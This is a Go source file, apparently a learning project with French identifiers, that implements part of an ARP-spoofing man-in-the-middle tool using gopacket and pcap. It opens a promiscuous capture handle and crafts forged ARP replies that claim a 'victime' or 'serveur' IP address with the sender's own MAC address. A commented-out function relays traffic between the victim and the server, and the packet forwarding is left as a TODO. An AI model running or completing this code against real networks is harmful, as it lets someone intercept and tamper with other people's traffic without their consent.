package main

import (
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// TODO mettre en place le forwarding
func createForwardingHandle(nameOfdevice string) *pcap.Handle {
	handle, err := pcap.OpenLive(nameOfdevice, 1600, true, pcap.BlockForever)
	if err != nil {
		panic(err)
	}
	return handle
}

// func handleWayForPacket(handle *pcap.Handle, packet gopacket.Packet, global *global) bool {
// 	if ipLayer := packet.Layer(layers.LayerTypeIPv4); ipLayer != nil {
// 		ip, _ := ipLayer.(*layers.IPv4)
// 		if ip.SrcIP == global.victime_ip && ip.DstIP == global.serveur_ip {
// 			forwardPacket(handle, global.victime_ip, global.victime_mac, global.serveur_ip, global.serveur_mac, packet)
// 			return true
// 		}
//
// 		if ip.SrcIP == global.serveur_ip && ip.DstIP == global.victime_ip {
// 			forwardPacket(handle, global.serveur_ip, global.serveur_mac, global.victime_ip, global.victime_mac, packet)
//
// 			return true
// 		}
// 	}
// 	return false
// }

func forwardPacket(handle *pcap.Handle, ip_to_usurpate net.IP, my_mac net.HardwareAddr, ip_target net.IP, mac_target net.HardwareAddr, packet gopacket.Packet) error {

	eth := layers.Ethernet{
		SrcMAC:       my_mac,
		DstMAC:       mac_target,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(my_mac),
		SourceProtAddress: []byte(ip_to_usurpate.To4()),
		DstHwAddress:      []byte(mac_target),
		DstProtAddress:    []byte(ip_target.To4()),
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		panic(err)
	}
	if err := handle.WritePacketData(buf.Bytes()); err != nil {
		panic(err)
	}
	return nil

}
